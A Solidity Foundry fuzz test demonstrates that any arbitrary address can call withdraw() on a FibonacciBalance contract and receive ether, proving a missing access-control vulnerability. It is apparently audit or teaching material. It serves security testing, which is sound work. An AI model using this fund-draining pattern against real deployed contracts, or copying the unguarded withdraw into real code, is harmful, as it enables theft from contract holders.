
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {FibonacciBalance} from "../src/FibonacciBalance.sol";

contract TestAccessControlFibonacciBalance is Test {
    FibonacciBalance public fibonacciBalance;
    address public fibonacciLibrary;
    
    function setUp() public {
        // Deploy the library first
        fibonacciLibrary = address(new FibonacciLib());
        
        // Deploy the FibonacciBalance contract with enough ether for withdrawals
        fibonacciBalance = new FibonacciBalance{value: 10 ether}(fibonacciLibrary);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // 1. Constraints
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // 2. CRITICAL - Exclude ALL privileged roles
        // The withdraw function has no access control - no privileged roles to exclude
        // Any address (including arbitrary callers) can call withdraw
        
        // 3. Constrain other fuzz args if present
        // No additional fuzz args needed for this function
        
        // 2. State Configuration
        
        // FUNDING: Fund the arbitrary caller with enough ether to cover potential gas costs
        vm.deal(caller, 1 ether);
        
        // STATE VARIABLES: Ensure the contract has enough balance for withdrawal
        // The contract is already funded with 10 ether in setUp()
        // The withdraw function transfers calculatedFibNumber * 1 ether
        // We need to ensure calculatedFibNumber is set to a valid value
        
        // Use vm.store to set calculatedFibNumber to a small value (e.g., 1) 
        // to avoid draining all contract balance in one test
        bytes32 calculatedFibNumberSlot = bytes32(uint256(1)); // Slot 1 for calculatedFibNumber
        vm.store(address(fibonacciBalance), calculatedFibNumberSlot, bytes32(uint256(1)));
        
        // 3. Execution & Assertion
        
        // Switch context to the arbitrary caller
        vm.prank(caller);
        
        // TRIGGER VULNERABILITY: Call withdraw from arbitrary address
        // This should succeed since there's no access control
        fibonacciBalance.withdraw();
        
        // ASSERT SUCCESS: Check that the caller received ether
        assertEq(caller.balance, 1 ether + 1 ether); // Initial 1 ether + 1 ether from withdrawal
    }
}

contract FibonacciLib {
    uint public start;
    uint public calculatedFibNumber;

    function setStart(uint _start) public {
        start = _start;
    }

    function setFibonacci(uint n) public {
        calculatedFibNumber = fibonacci(n);
    }

    function fibonacci(uint n) internal returns (uint) {
        if (n == 0) return start;
        else if (n == 1) return start + 1;
        else return fibonacci(n - 1) + fibonacci(n - 2);
    }
}
